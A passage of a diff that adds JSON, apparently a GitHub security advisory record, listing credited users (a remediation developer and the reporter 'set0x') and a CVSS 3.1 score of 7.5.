+          "received_events_url": "https://api.github.com/users/AlexV525/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "set0x",
+          "id": 15133015,
+          "node_id": "MDQ6VXNlcjE1MTMzMDE1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/15133015?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/set0x",
+          "html_url": "https://github.com/set0x",
+          "followers_url": "https://api.github.com/users/set0x/followers",
+          "following_url": "https://api.github.com/users/set0x/following{/other_user}",
+          "gists_url": "https://api.github.com/users/set0x/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/set0x/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/set0x/subscriptions",
+          "organizations_url": "https://api.github.com/users/set0x/orgs",
+          "repos_url": "https://api.github.com/users/set0x/repos",
+          "events_url": "https://api.github.com/users/set0x/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/set0x/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 0,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "score": 7.5
+    }
   }
 ]
